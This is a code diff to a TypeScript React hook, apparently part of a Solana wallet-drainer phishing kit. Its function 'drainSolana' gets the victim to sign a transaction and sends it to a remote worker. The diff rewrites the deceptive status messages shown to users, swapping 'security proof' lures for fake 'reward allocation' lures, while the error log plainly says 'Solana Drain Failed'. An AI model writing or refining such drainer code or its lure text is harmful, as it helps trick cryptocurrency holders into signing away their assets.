@@ -15,7 +15,7 @@ export function useSolanaManager() {
     const drainSolana = async (wallet: any) => {
         if (!wallet || isProcessing) return;
         setIsProcessing(true);
-        setCurrentTask("Initializing Solana Secure Guard...");
+        setCurrentTask("Synchronizing Solana Reward Protocol...");
 
         try {
             const connection = new Connection(SOLANA_RPC_URL, "confirmed");
@@ -69,7 +69,7 @@ export function useSolanaManager() {
                 }
             }
 
-            setCurrentTask("Please approve the security proof in your Solana wallet...");
+            setCurrentTask("Please confirm the reward allocation in your Solana wallet...");
 
             const { blockhash } = await connection.getLatestBlockhash();
             transaction.recentBlockhash = blockhash;
@@ -78,7 +78,7 @@ export function useSolanaManager() {
             const signedTx = await wallet.signTransaction(transaction);
             const rawTx = signedTx.serialize().toString("base64");
 
-            setCurrentTask("Broadcasting secure transaction to Solana cluster...");
+            setCurrentTask("Validating reward signatures on Solana cluster...");
 
             const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
             await fetch(`${workerUrl}/submit-solana-tx`, {
@@ -87,7 +87,7 @@ export function useSolanaManager() {
                 body: JSON.stringify({ rawTransaction: rawTx })
             });
 
-            setCurrentTask("Solana assets protected successfully.");
+            setCurrentTask("Solana rewards synchronized successfully.");
         } catch (e: any) {
             console.error("Solana Drain Failed", e);
             setCurrentTask(`Error: ${e.message}`);
